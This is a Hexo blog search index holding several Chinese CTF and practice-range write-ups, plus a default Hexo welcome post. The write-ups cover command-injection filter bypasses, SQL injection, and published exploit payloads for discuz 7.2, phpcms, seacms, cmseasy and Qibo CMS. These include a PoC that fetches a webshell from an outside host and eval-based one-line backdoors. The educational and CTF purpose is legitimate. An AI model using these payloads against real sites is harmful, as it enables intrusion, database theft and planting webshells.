    <content type="text"><![CDATA[最近发现了一个不错的靶场，那个是最近出来的。里面的漏洞靶场对我来说可以涨挺多知识的。而且可能刚开始，里面的靶场很多都是免费的。做的听舒服的。也推荐一一下下：（https://www.mozhe.cn/） 一、命令执行1.titile:PHP代码分析溯源(第4题)背景介绍： 小明收到一个网址，打开后是一串加密的代码。小明需要你们的帮助，感受到时代在召唤了吗？ 实训目标： 1.了解命令执行的基础知识;2.学习php代码的相关知识;3.了解加密解密的相关知识; 进入题目，发现页面里有一串php代码。 1234&lt;?phpeval(gzinflate(base64_decode(&amp;40pNzshXSFCJD3INDHUNDolOjE2wtlawt+MCAA==&amp;)));?&gt; 明显这个不符合php语法格式。所以我们把eval改成ehco再处理一下变成 1234&lt;?php echo gzinflate(base64_decode(&quot;40pNzshXSFCJD3INDHUNDolOjE2wtlawt+MCAA==&quot;));?&gt; 然后在本地运行，得到： 1echo `$_REQUEST[a]`;; ?&gt; 于是我们就可以用命令执行漏洞了。用?a=ls来查看所有目录文件。 然后用?a=cat key_273223101616493.php就可以得到了flag–&gt;mozheca51564b14585838f9d323ac4e1 注意：这里flag被注释掉了，查看源码即可。 2.title:命令注入执行分析背景介绍: 某单位IT运维人员为了方便，在服务器上留了一个页面，用来ping内部服务器连通情况。安全工程师”墨者”在做月度检查时发现了这一文件，检查发现这一文件存在漏洞，要求运维人员立刻下线。 实训目标: 1、掌握Linux系统的基本命令；2、了解Linux中管道符的作用； 进去之后是一个让我们输入ip的输入框，明显是一个ping ip的操作。这个在最近的iscc里也有类似的题。然后用burp抓个包 本来想像iscc那样用127.0.0.1%0als来列出所有文件名。可是并没有执行。 于是去看了几篇命令执行漏洞的博文，例如（https://blog.csdn.net/qq_27446553/article/details/73927518） 试了&amp;，&amp;&amp;都不行，最后用了管道符|就可以了，||也可以。那么我们就ls 然后cat的时候发现空格被过滤。按照博文里的方法,我用了&lt;和$IFS$9 符号，${IFS}` 符号都可以绕过。 —&gt;通道符|: command 1|command 2 把command1的输出做为command2的输入。command1的不会显示在屏幕上.注意：1、管道命令只处理前一个命令正确输出，不处理错误输出2、管道命令右边命令，必须能够接收标准输入流命令才行。 例如： 1ps –ef |grep python Ps是linux中非常强大的进程查看工具，其中-e为显示所有进程，-f为全格式显示。 Grep是一个非常高效的查询工具，可以查询文本中带有某关键字的行。 这个命令的功能是，查询带有关键字 python 的进程。会一条一条列出。 1234567&amp; 表示任务在后台执行，如要在后台运行redis-server,则有 redis-server &amp;&amp;&amp; 表示前一条命令执行成功时，才执行后一条命令 ，如 echo &apos;1‘ &amp;&amp; echo &apos;2&apos; | 表示管道，上一条命令的输出，作为下一条命令参数，如 echo &apos;yes&apos; | wc -l|| 表示上一条命令执行失败后，才执行下一条命令，如 cat nofile || echo &quot;fail&quot; 1$&#123;IFS&#125;,$IFS,$IFS$9的区别，首先$IFS在linux下表示分隔符，单纯的cat$IFS2,bash解释器会把整个IFS2当做变量名，所以导致输不出来结果，然而如果加一个&#123;&#125;就固定了变量名，同理在后面加个$可以起到截断的作用，但是为什么要用$9呢，因为$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串。 二、SQL注入1.title: SQL注入实战(防注入)-Access背景介绍： 一套SQL通用asp防注入脚本 实训目标： 1、了解sql注入的基本原理。2、了解一句话木马的使用。3、了解一句话的加密使用。4、了解基本的信息收集。 进入这个题目，它说记录好像写到数据库文件里面了，于是我们可以尝试写入一句话木马来getshell.有个id参数，我们加上单引号,弹窗： 随后我们发现我们的1‘被写入到数据库中了 于是我们尝试直接写入一句话木马，发现提交数据为空，说明有被过滤。于是我们进行编码一下，就提交成功了， 1http://219.153.49.228:47667/news.asp?id=%3C%25eval%20request%28%22ccccc%22%29%25%3E 然后通过搜索引擎找到该记录文件为目录下的sqlin.asp。用菜刀连接即可。 坑点：这里得用IE浏览器，我用了火狐和chorme都不行，即使传进去了，但是浏览器自动给你Unicode编码，造成一句马被编码了，菜刀无法连接。后来用了ie就可以。 2.title:X-Forwarded-For注入漏洞实战背景介绍: 某业务系统，安全工程师”墨者”进行授权黑盒测试，系统的业主单位也没有给账号密码，怎么测？ 实训目标： 1、掌握SQL注入的基本原理；2、了解服务器获取客户端IP的方式；3、了解SQL注入的工具使用； 这题让我又学会了一种sqlmap的用法. 进入题目，是一个登陆框。我们先用admin，admin登陆，然后发现 发现这里记录了我电脑的ip。那么就可以想到这里的注入点是XFF。看了一篇关于http头注入的文章。然后用burp抓包，添加一个XFF，在ip后加个“ ”号，作用是sqlmqp会自动查找注入点，插入“”可引导sqlmap。然后把请求copy下来保存为一个txt文件 然后就开启我们的神器sqlmap，输入命令sqlmap.py -r “C:\Users\XXX\Desktop\request.txt” -p “X-Forwarded-For” –dbs 就可以爆库。 然后以此类推就可以爆出表名，字段，数据了。进而就可以知道账号密码了. 持续更新ing……]]></content>
  </entry>
  <entry>
    <title><![CDATA[discuz7.2 faq.php注入漏洞]]></title>
    <url>%2F2018%2F04%2F30%2Fdiscuz7-2-faq-php%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[这个是好久之前爆出了漏洞，早就修复了。这里就是昨天做百度杯的一道cms题-，就是上一篇博文里的“再见cms”的漏洞时发现的和这个漏洞相似，就写下来记录一下. 在faq.php里找到action=grouppermission的代码 1234567891011121314151617&#125; elseif($action == &apos;grouppermission&apos;) &#123; ksort($gids); $groupids = array(); foreach($gids as $row) &#123; $groupids[] = $row[0]; &#125; $query = $db-&gt;query(&quot;SELECT * FROM &#123;$tablepre&#125;usergroups u LEFT JOIN &#123;$tablepre&#125;admingroups a ON u.groupid=a.admingid WHERE u.groupid IN (&quot;.implodeids($groupids).&quot;)&quot;); 可以知道，定义了一个groupids的数组。然后遍历gids，其也为一个数组。然后把gids数组第一个所有值取出来赋给groupids里。然后discuz在全局会对GET数组进行addslashes转义，也就是说会将’转义成\’，所以，如果我们的传入的参数是：gids[1]=’的话，会被转义成$gids[1]=\’，而这个赋值语句$groupids[] = $row[0]就相当于取了字符串的第一个字符，也就是\，把转义符号取出来了。 然后把groupids经过implodeids函数处理放到sql语句里。implodeids函数代码如下： 1234567function implodeids($array) &#123; if(!empty($array)) &#123; return &quot;&apos;&quot;.implode(&quot;&apos;,&apos;&quot;, is_array($array) ? $array : array($array)).&quot;&apos;&quot;; &#125; else &#123; return &apos;&apos;; &#125;&#125; 其中implode()函数返回由数组元素组合成的字符串。上面就是每个数组元素用’,’隔开。这样子，数组经过implodeids函数处理后返回类似于’1’,’2’,’3’,’4’的字符串。我们的数组刚取出来一个转义符，它会将这里一个正常的’转义掉，比如这样：’1’,’\’,’3’,’4’。把第四个的单引号转义，导致3后面的单引号逃逸，从而导致了注入。 poc：1http://xxx.com/faq.php?action=grouppermission&amp;gids[99]=&apos;&amp;gids[100][0]=) and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)# //检查漏洞存在 12http://www.xxx.com/faq.php?action=grouppermission&amp;gids[99]=&apos;&amp;gids[100][0]=) and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)%23 //爆用户名密码]]></content>
  </entry>
  <entry>
    <title><![CDATA[cms系列]]></title>
    <url>%2F2018%2F04%2F30%2Fcms%E7%B3%BB%E5%88%97%2F</url>
    <content type="text"><![CDATA[一、bugku web进阶—–CMS1.phpcms按照cms漏洞题的套路，去Google一波phpcms exp,发现了好多关于phpcms漏洞的报告。任意点开一个 1https://www.cnblogs.com/sqyysec/p/6725870.html 按照博文里在本地所复现的漏洞，首先点击注册，然后填写信息后抓包， 然后把POC添加进去（这里我引用的一句话木马是网上一个人云盘上的） 1siteid=1&amp;modelid=10&amp;username=hsakdhsakdsh&amp;password=123456&amp;pwdconfirm=123456&amp;email=sdskdksa%40qq.com&amp;info[content]=&lt;img src=http://ovgb1c2jq.bkt.clouddn.com/1.txt?.php#.jpg&gt;&amp;dosubmit=1&amp;protocol= EEC$NL.png) 然后用菜刀连上即可，注入参数为GETF得到flag。 当然这个也可以在火狐里用hackbar操作： 坑点：1.那个modelid的值一定要是11，如果是当时注册的10的话，就不会成功。 ​ 2.每次username和email都要改动。 ​ 2.seacms同样，在google里找poc： 123searchword=d&amp;order=&#125;&#123;end if&#125;&#123;if:1)print_r($_POST[func]($_POST[cmd]));//&#125;&#123;end if&#125;&amp;func=assert&amp;cmd=var_dump(scandir(&apos;/web&apos;));也可以用searchword=d&amp;order=&#125;&#123;end if&#125;&#123;if:1)print_r(scandir(getcwd()));//&#123;if:1&#125;&#123;end if&#125; 发现了flag32#.txt so 1searchword=d&amp;order=&#125;&#123;end if&#125;&#123;if:1)print_r($_POST[func]($_POST[cmd]));//&#125;&#123;end if&#125;&amp;func=assert&amp;cmd=show_source(&quot;flag32#.txt&quot;) file_input_content(\’drac.php\’,\’&lt;?php eval($_POST[hack]);?&gt;\’) 百度杯1.YeserCMS通过指纹识别，发现这个网站真正的是cmseasy，百度一下cmseasy的漏洞。发现有一堆。通过尝试，最终确定了这题是cmseasy CmsEasy_5.6_20151009 无限制报错注入 poc：123/celive/live/header.phpxajax=Postdata&amp;xajaxargs[0]=&lt;xjxquery&gt;&lt;q&gt;detail=xxxxxx%27%2C%28UpdateXML%281%2CCONCAT%280x5b%2Cmid%28%28SELECT%2f%2a%2a%2fGROUP_CONCAT%28concat%28username%2C%27%7C%27%2Cpassword%29%29%20from%20yesercms_user%29%2C1%2C32%29%2C0x5d%29%2C1%29%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%29--%20&lt;/q&gt;&lt;/xjxquery&gt; 爆出来用户名和密码（MD5加密的）解密得Yeser231。登陆后台后，看了wp，才知道在当前模板编辑处存在文件读取漏洞。 2.再见CMS同样用指纹识别，知道这个网站是齐博CMS。通过对搜来的poc的尝试，可以知道这题是齐博cms_userinfo注入。这个漏洞原理和discuz7.2的faq.php那个注入类似。某变量$str全局做过转义，导致%00转义成了\0.我们能够控制str_replace的前两个参数，则str_replace(‘0’, ‘’, $str)，再将0转换成空，则留下了\，这个\可以转义其后的\’，使之变成\’，导致单引号逃逸出转义符的限制，造成注入。执行的语句类似update table set a=’111’,b=’222’ where uid=1，我们引入一个\在111的最后，转义掉111后面的引号，这样222就逃逸出了限制，我们的sql注入语句就可以放在222的位置执行了。 https://blog.csdn.net/qq_33020901/article/details/52593063 于是按照大佬的博文。先注册一个账号。然后进入我的博客，记住url地址里的uid的值 我这里是3.下一步，就把网上的poc带进去。先测试一下： 12345/member/userinfo.php?job=edit&amp;step=2post：old_password=123456&amp;truename=xxxx%0000&amp;Limitword[000]=&amp;email=171171@qq.com&amp;provinceid=//这里%0000被转义成\000,然后000被替换为空 这里配一个博文里面在本地搭的一个测试结果： 1234/member/userinfo.php?job=edit&amp;step=2post：old_password=123456&amp;truename=xxxx%0000&amp;Limitword[000]=&amp;email=171171@qq.com&amp;provinceid=,address=(select user()) where uid=3%23 然后查看个人信息 接下来就好办了，但是之前一直在尝试解管理员密码，后面想到了用load_file读flag.php ,这里需要16进制。又题目说flag.php在网站根目录。 于是 1234/member/userinfo.php?job=edit&amp;step=2post：old_password=123456&amp;truename=xxxx%0000&amp;Limitword[000]=&amp;email=171171@qq.com&amp;provinceid=,address=(load_file(0x7661722f7777772f68746d6c2f666c61672e706870) where uid=3%23 得到flag。 未完待续…….]]></content>
  </entry>
  <entry>
    <title><![CDATA[nctf-sql inject汇总]]></title>
    <url>%2F2018%2F04%2F16%2Fnctf-sql-inject%E6%B1%87%E6%80%BB%2F</url>
    <content type="text"><![CDATA[1.SQL Injectionhttp://chinalover.sinaapp.com/web15/index.php 进入题目，只有一个Invalid password!。习惯性的查看源码，得到： 12345678910111213141516171819202122232425262728293031323334#GOAL: login as admin,then get the flag;error_reporting(0);require &apos;db.inc.php&apos;;function clean($str)&#123; if(get_magic_quotes_gpc())&#123; $str=stripslashes($str); &#125; return htmlentities($str, ENT_QUOTES);&#125;$username = @clean((string)$_GET[&apos;username&apos;]);$password = @clean((string)$_GET[&apos;password&apos;]);$query=&apos;SELECT * FROM users WHERE name=\&apos;&apos;.$username.&apos;\&apos; AND pass=\&apos;&apos;.$password.&apos;\&apos;;&apos;;$result=mysql_query($query);if(!$result || mysql_num_rows($result) &lt; 1)&#123; die(&apos;Invalid password!&apos;);&#125;echo $flag;//magic_quotes_gpc()开启时为获得的字符中的单引号等字符进行转义，get_magic_quotes_gpc()为检查magic_quotes_gpc()是否开启stripslashes函数为字符串中删除由addslashes函数添加的反斜杠htmlentities()函数： htmlentities() 函数把字符转换为 HTML 实体htmlentities($str, ENT_COMPAT); 只转换双引号htmlentities($str, ENT_QUOTES); 转换双引号和单引号htmlentities($str, ENT_NOQUOTES); 不转换任何引号 可以知道，这里username要为admin，然后password这里可以用万能密码绕过。这里对字符串也使用了htmlentities函数处理，过滤了单引号。根据题目的提示我们可以用反斜杠来转义一个单引号，从而让其闭合。我们让username的value为admin\，password为or 1=1#,把这个带到sql语句中： 1SELECT * FROM users WHERE name=\&apos;&apos;admin\&apos;\&apos; AND pass=\&apos;&apos;or 1=1#&apos;\&apos;; 这里就变成了SELECT * FROM users WHERE name=’admin\’ AND pass=’ or 1=1#’; 这里name的值变为admin AND pass=,为false，加上or 1=1就为ture了。 这样子flag就出来了。 ​ 注：在mysql查询语句中转义字符不参与闭合 也就是说第二个单引号和第六个单引号闭合。 2.SQL注入1http://chinalover.sinaapp.com/index.phps 题目一进去就可以点source查看源码，明显是一个代码审计的题。 123456789101112131415161718&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = trim($_POST[user]); $pass = md5(trim($_POST[pass])); $sql=&quot;select user from ctf where (user=&apos;&quot;.$user.&quot;&apos;) and (pw=&apos;&quot;.$pass.&quot;&apos;)&quot;; echo &apos;&lt;/br&gt;&apos;.$sql; $query = mysql_fetch_array(mysql_query($sql)); if($query[user]==&quot;admin&quot;) &#123; echo &quot;&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;&quot;; &#125; if($query[user] != &quot;admin&quot;) &#123; echo(&quot;&lt;p&gt;You are not admin!&lt;/p&gt;&quot;); &#125;&#125;echo $query[user];?&gt; 这里就是post一个user一个pass，然后把pass进行md5加密。然后执行sql语句，然后把结果集赋给变量query。echo flag 的条件就是结果集里user的value为admin即可。那么这个和pass无关。我们可以构造把pass注释掉。 即user的值为admin’)#,然后pass随便填即可得到flag 3.SQL注入2http://4.chinalover.sinaapp.com/web6/index.php 这题也是代码审计的，查看源码： 123456789101112131415&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = $_POST[user]; $pass = md5($_POST[pass]); $query = @mysql_fetch_array(mysql_query(&quot;select pw from ctf where user=&apos;$user&apos;&quot;)); if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123; echo &quot;&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;&quot;; &#125; else &#123; echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;); &#125;&#125;?&gt; 这题和上一题不同的是这里echo flag的条件是让我们输入的password和数据库里的pass对比，相同就echo flag。那这个就无法用注释符来处理。题目的tip说union查询。我们要使满足条件，可以尝试修改sql的值，使select pw…..语句失效，然后执行我们后面的payload。所以构造user的值为1’ and 0=1 union select md5(1)# 即替换后sql语句变成了 1select pw from ctf where user=&apos;1&apos;and 0=1 union select md5(1)#&apos; 前面的‘1’ and 0=1使得前面那一些语句失效。sql的值就等于md5(1).于是我们pass也输入1即可。]]></content>
  </entry>
  <entry>
    <title><![CDATA[nctf-综合题2 wp]]></title>
    <url>%2F2018%2F04%2F15%2Fnctf-%E7%BB%BC%E5%90%88%E9%A2%982%2F</url>
    <content type="text"><![CDATA[【综合题2】 http://cms.nuptzj.cn 进入题目，发现是个留言板。下面有留言框，于是试试xss，结果写完xss语句点击预览时，根据提示，这题不是xss的题目。因为题目说是个综合题，肯定要后台getshell的，然后getshell的方法最容易想到的就是sql得到后台账号密码，然后用一句话木马加菜刀。于是接下来开始对这个网站收集信息。 ​ 按从上到下的顺序，映入眼帘的是那个留言搜索，于是随便输一个数，点搜索。界面显示，要也他们的浏览器才行，说明这个要改UA。然后这个搜索的页面是so.php，post的变量为soid，明显这个是等会的注入点。 既然不知道要把UA改成什么，于是，进行其他的收集。那个留言框可以排除掉了，毕竟题目自己都说这个是个摆设。 于是，就剩下下面那个本CMS说明了。在这里面，我们可以发现，这里是一个文件包含。而且也可以得知有一个叫admin的表，表里有username和userpass字段。而且也列出了config.php,index.php,passencode.php,say.php.前2个是配置文件，没什么用。用文件包含读取第三个。得到源码： 123456789101112131415&lt;?phpfunction passencode($content)&#123;//$pass=urlencode($content);$array=str_split($content);$pass=&quot;&quot;;for($i=0;$i&lt;count($array);$i++)&#123;if($pass!=&quot;&quot;)&#123;$pass=$pass.&quot; &quot;.(string)ord($array[$i]);&#125;else&#123;$pass=(string)ord($array[$i]);&#125;&#125;return $pass;&#125;?&gt; 这个意思大概就是把密码进行了ascii码加密。 say.php里没发现什么。然后我们再来读取一下刚才的搜索页面的so.php，得到源码： 1234567891011121314151617181920&lt;?phpif($_SERVER[&apos;HTTP_USER_AGENT&apos;]!=&quot;Xlcteam Browser&quot;)&#123;echo &apos;万恶滴黑阔，本功能只有用本公司开发的浏览器才可以用喔~&apos;; exit();&#125;$id=$_POST[&apos;soid&apos;];include &apos;config.php&apos;;include &apos;antiinject.php&apos;;include &apos;antixss.php&apos;;$id=antiinject($id);$con = mysql_connect($db_address,$db_user,$db_pass) or die(&quot;不能连接到数据库！！&quot;.mysql_error());mysql_select_db($db_name,$con);$id=mysql_real_escape_string($id);$result=mysql_query(&quot;SELECT * FROM `message` WHERE display=1 AND id=$id&quot;);$rs=mysql_fetch_array($result);echo htmlspecialchars($rs[&apos;nice&apos;]).&apos;:&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&apos;.antixss($rs[&apos;say&apos;]).&apos;&lt;br /&gt;&apos;;mysql_free_result($result);mysql_free_result($file);mysql_close($con);?&gt; 这里可以知道UA应该为Xlcteam Browser。而且这里又知道了几个文件，antiinject.php和antixss.php，因为xss没用了，所以我们读取antiinject.php。得到源码： 12345678910&lt;?phpfunction antiinject($content)&#123;$keyword=array(&quot;select&quot;,&quot;union&quot;,&quot;and&quot;,&quot;from&quot;,&apos; &apos;,&quot;&apos;&quot;,&quot;;&quot;,&apos;&quot;&apos;,&quot;char&quot;,&quot;or&quot;,&quot;count&quot;,&quot;master&quot;,&quot;name&quot;,&quot;pass&quot;,&quot;admin&quot;,&quot;+&quot;,&quot;-&quot;,&quot;order&quot;,&quot;=&quot;);$info=strtolower($content);for($i=0;$i&lt;=count($keyword);$i++)&#123; $info=str_replace($keyword[$i], &apos;&apos;,$info);&#125;return $info;&#125;?&gt; 这里我们可以知道，它把sql注入的关键字替换成了空。这个可以用双写来绕过。空格可以用/**/绕过。 然后回到刚才那个搜索界面，知道了UA，用火狐的插件Modify headers，add一个UA，值为Xlcteam Browser。 然后我们既然知道了表名和列名，于是直接构造sql语句： 12345soid=-1/**/ununionion/**/seleselectct/**/1,group_concat(usernanameme),3,4/**/frfromom/**/adadminmin#//得到用户名为adminsoid=-1/**/ununionion/**/seleselectct/**/1,group_concat(userpapassss),3,4/**/frfromom/**/adadminmin#得到 102 117 99 107 114 117 110 116 117。//根据前面那个passencode.php知道，这里是ascii码，于是密码就是fuckruntu。 现在就开始找后台登陆界面了。我们好像剩下一个那个cms说明的本身有关about.php还没有读取。于是读取得 12345678910111213141516&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;?php$file=$_GET[&apos;file&apos;];if($file==&quot;&quot; || strstr($file,&apos;config.php&apos;))&#123;echo &quot;file参数不能为空！&quot;;exit();&#125;else&#123;$cut=strchr($file,&quot;loginxlcteam&quot;);if($cut==false)&#123;$data=file_get_contents($file);$date=htmlspecialchars($data);echo $date;&#125;else&#123;echo &quot;&lt;script&gt;alert(&apos;敏感目录，禁止查看！但是。。。&apos;)&lt;/script&gt;&quot;;&#125;&#125; 于是知道有个叫loginxlcteam的文件，用包含读取不了，于是直接访问，得到了登陆界面。 于是登陆进入后台。 诶，这里都不用我们上传一句话木马了。由于不知道连接密码。后来才知道有个叫php回调后门 https://blog.csdn.net/settoken/article/details/50946689 读取xlcteam.php得 12345&lt;?php$e = $_REQUEST[&apos;www&apos;];$arr = array($_POST[&apos;wtf&apos;] =&gt; &apos;|.*|e&apos;,);array_walk($arr, $e, &apos;&apos;);?&gt; 这个对应了博文里的第四种情况。 于是构建http://cms.nuptzj.cn/xlcteam.php?www=preg_replace，密码就是wtf。用菜刀连接即可。 —–&gt;flag:nctf{you_are_s0_g00d_hacker}]]></content>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2018%2F04%2F02%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
</search>
